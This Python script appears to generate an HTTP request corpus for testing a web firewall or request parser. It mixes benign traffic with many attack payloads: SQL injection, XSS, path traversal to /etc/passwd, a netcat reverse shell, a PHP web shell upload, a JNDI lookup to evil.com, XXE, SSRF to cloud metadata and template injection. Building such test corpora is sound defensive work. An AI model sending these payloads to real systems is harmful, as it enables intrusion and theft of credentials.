"""Writes the request corpus used by run.sh (benign traffic, common attack
classes, and every request body processor)."""
import sys

H = ("Host: www.example.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0\n"
     "Accept: text/html,application/xhtml+xml\nAccept-Language: en-US,en;q=0.5\n"
     "Accept-Encoding: gzip, deflate\nConnection: keep-alive\n")
reqs = []


def g(uri, extra="", method="GET", body="", ver="1.1"):
    reqs.append(f"{method} {uri} {ver}\n{H}{extra}\n{body}")


g("/")
g("/index.html?page=1&sort=name")
g("/search?q=hello+world&lang=en")
g("/products?id=1%27%20OR%20%271%27%3D%271")
g("/products?id=1 UNION SELECT username,password FROM users--")
g("/item?id=1;DROP TABLE users")
g("/login?user=admin'--&pass=x")
g("/q?x=sleep(5)%23")
g("/q?x=1' AND benchmark(10000000,md5(1))--")
g("/comment?text=<script>alert(1)</script>")
g("/comment?text=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E")
g("/comment?text=javascript:alert(document.cookie)")
g("/page?file=../../../../etc/passwd")
g("/page?file=..%2f..%2f..%2fetc%2fshadow")
g("/page?file=/etc/passwd%00.jpg")
g("/run?cmd=;cat /etc/passwd")
g("/run?cmd=$(id)")
g("/run?cmd=| nc -e /bin/sh 10.0.0.1 4444")
g("/php?x=<?php system($_GET['c']); ?>")
g("/php?x=php://filter/convert.base64-encode/resource=index.php")
g("/java?x=${jndi:ldap://evil.com/a}")
g("/x?y=%{(#_='multipart/form-data')}")
g("/backup.bak")
g("/.git/config")
g("/web.config")
g("/", method="TRACE")
g("/", extra="User-Agent: sqlmap/1.5.2#stable (http://sqlmap.org)\n")
g("/", extra="User-Agent: Nikto/2.1.6\n")
g("/?a=1&a=2&a=3&b=%41%42%43")
g("/%2e%2e/%2e%2e/etc/passwd")
g("/search?q=%u0027%u0020OR%u00201=1")
g("/search?q=SELECT%09*%0aFROM%0dusers")
g("/api", method="POST", extra="Content-Type: application/x-www-form-urlencoded\nContent-Length: 39\n",
  body="user=admin&pass=x' or '1'='1&remember=1")
g("/api", method="POST", extra="Content-Type: application/x-www-form-urlencoded\n",
  body="msg=<svg/onload=alert(1)>&x=normal")
g("/api", method="POST", extra="Content-Type: application/json\n",
  body='{"user":"bob","query":"1 union select 1,2,3","nested":{"arr":[1,"<script>x</script>",{"k":"../../etc/passwd"}]}}')
g("/api", method="POST", extra="Content-Type: application/json\n", body='{"broken": [1,2,')
g("/api", method="POST", extra="Content-Type: application/xml\n",
  body='<?xml version="1.0"?><root><user>admin\' or 1=1--</user><x>&lt;script&gt;</x></root>')
g("/api", method="POST", extra="Content-Type: text/xml\n",
  body='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>')
mp = ('--XYZ\r\nContent-Disposition: form-data; name="title"\r\n\r\nhello\r\n'
      '--XYZ\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n'
      'Content-Type: application/octet-stream\r\n\r\n<?php echo `id`; ?>\r\n--XYZ--\r\n')
g("/upload", method="POST", extra="Content-Type: multipart/form-data; boundary=XYZ\n", body=mp)
g("/upload", method="POST", extra="Content-Type: multipart/form-data; boundary=XYZ\n",
  body='--XYZ\r\nContent-Disposition: form-data; name="a"\r\n\r\nx\r\n--XYZ\r\nbroken')
g("/", extra="Cookie: session=abc123; theme=dark\n")
g("/", extra="Cookie: id=1' or '1'='1; x=<script>\n")
g("/", extra="Referer: http://evil.com/?q=<script>alert(1)</script>\n")
g("/", extra="X-Forwarded-For: 127.0.0.1, ' or 1=1--\n")
g("/", extra="Content-Length: abc\n")
g("/?q=" + "A" * 5000)
g("/?" + "&".join(f"p{i}=v{i}" for i in range(300)))
g("/admin/config.php?debug=true&__proto__[admin]=1")
g("/ssrf?url=http://169.254.169.254/latest/meta-data/")
g("/nosql?user[$ne]=x&pass[$gt]=")
g("/ldap?u=*)(uid=*))(|(uid=*")
g("/template?name={{7*7}}")
g("/template?name=${T(java.lang.Runtime).getRuntime().exec('id')}")
g("/encoded?x=%253Cscript%253E")
g("/unicode?x=%EF%BC%9Cscript%EF%BC%9E")
g("/", ver="1.0")
g("/download?f=report.pdf", extra="Range: bytes=0-1,2-3,4-5,6-7,8-9,10-11\n")
g("/", method="PUT", extra="Content-Type: text/plain\n", body="hello")
g("/redirect?next=//evil.com")
g("/crlf?x=foo%0d%0aSet-Cookie:%20a=b")

with open(sys.argv[1], "w") as f:
    f.write("###\n" + "\n###\n".join(reqs) + "\n")
